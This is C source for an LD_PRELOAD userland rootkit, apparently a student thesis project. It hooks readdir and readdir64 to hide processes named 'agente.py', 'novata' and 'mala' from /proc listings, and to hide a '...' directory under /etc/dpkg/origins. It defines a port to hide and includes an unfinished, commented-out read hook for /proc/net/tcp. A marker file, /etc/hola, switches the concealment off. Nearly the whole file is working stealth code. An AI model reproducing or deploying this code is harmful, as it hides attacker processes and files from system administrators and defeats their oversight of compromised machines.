#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "agente.py";
static const char* process_to_filter2 = "novata";
static const char* process_to_filter3 = "mala";

/*
 * Port to hide
 */
static const char* port_to_filter = ":04D2";

/*
 * /Proc/self
 */
static const char* proc_self = "/proc/self";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

/*
 * Detect if uid is 0
 */
static int is_sudo(){

    FILE* f = fopen("/etc/hola", "r");
    if(f == NULL) {
        return 0;
    }

    fclose(f);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if( is_sudo()==0 &&                                         \
                ((get_dir_name(dirp, dir_name, sizeof(dir_name)) &&     \
                    strcmp(dir_name, "/proc") == 0 &&                   \
                    get_process_name(dir->d_name, process_name) &&      \
                    strcmp(process_name, process_to_filter) == 0) ||    \
                (strcmp(dir_name, "/etc/dpkg/origins") == 0 &&          \
                    strcmp(dir->d_name, "...")==0) ||                   \
                (strcmp(process_name, process_to_filter2) == 0) ||      \
                (strcmp(process_name, process_to_filter3) == 0))){      \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);



static int get_process_pid(char* buf, size_t size)
{

    ssize_t ret = readlink(proc_self, buf, size);
    if (ret == -1)
        return 0;

    buf[ret] = 0;
    return 1;

}


static int get_file_name(int fd, char* buf, size_t size)
{
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

ssize_t read (int fd, void *buf, size_t count){

    if(original_read == NULL) {                                    
        original_read = dlsym(RTLD_NEXT, "read");                
        if(original_read == NULL)                                  
        {                                                               
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         
        }                                                               
    } 

    *****poner aqui el filtro*****
    char pid_string[256];
    char filename[256];
    char tmp[256];
    char line[150];

    get_process_pid(pid_string, sizeof(pid_string));
    get_file_name(fd, filename, sizeof(filename));

    snprintf(tmp, sizeof(tmp), "/proc/%s/net/tcp", pid_string);

    if(strcmp(tmp, filename) == 0){
        FILE* fp = fopen("/home/tfg/Escritorio/adios.txt", "a");

        fwrite( (char*)buf, count, 1, fp);

        fclose(fp);
    }



    return original_read(fd, buf, count);
}*/